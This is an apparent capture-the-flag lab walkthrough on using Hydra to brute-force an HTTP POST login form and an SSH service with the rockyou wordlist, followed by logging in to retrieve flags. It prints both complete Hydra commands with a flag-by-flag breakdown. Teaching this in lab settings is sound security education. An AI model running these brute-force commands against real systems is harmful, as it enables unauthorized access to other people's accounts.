Hydra Basics

Overview

This guide covers basic Hydra usage for brute-forcing login credentials on HTTP forms and SSH services.


---

Step 1: Identify the Target

Navigate to the target IP address.

Determine what service (e.g., web form, SSH) the credentials are associated with.

In this case, it is an HTTP form.



---

Step 2: Trigger an Error Message

Attempt to log in with incorrect credentials.

Take note of the error message that appears â€” this will be used in the Hydra command to recognize failed login attempts.



---

Step 3: Brute-Force HTTP POST Login with Hydra

Use the following Hydra command for targeting an HTTP POST form with a dictionary attack:

hydra -l molly -P /usr/share/wordlists/rockyou.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."

Command Breakdown:

-l molly: Single username to use (molly)

-P /usr/share/wordlists/rockyou.txt: Path to the password dictionary

target_ip: Target IP address or hostname

http-post-form: Specifies HTTP POST form attack method

/login:: Path to the login form

username=^USER^: Placeholder for username

password=^PASS^: Placeholder for password

F=Your username or password is incorrect.: Text of the failure message


> Note: Adjust the form path and failure message based on the web application's behavior.




---

Step 4: Submit the Found Credentials

After Hydra discovers the correct password, manually log in through the HTTP form using the recovered credentials to obtain the flag.



---

Step 5: Brute-Force SSH Credentials with Hydra

If targeting an SSH service instead, use the following Hydra command:

hydra -l molly -P /usr/share/wordlists/rockyou.txt target_ip ssh

Command Breakdown:

-l molly: Single username (molly)

-P /usr/share/wordlists/rockyou.txt: Path to the password dictionary

target_ip: Target IP address or hostname

ssh: Specifies the SSH service



---

Step 6: Access via SSH

Once Molly's SSH password is compromised, you can sign in via SSH to the target system.

Retrieve the second flag from the SSH session.

> Warning:
Always ensure you have explicit authorization before conducting any penetration testing activities. Unauthorized use of these techniques is illegal.
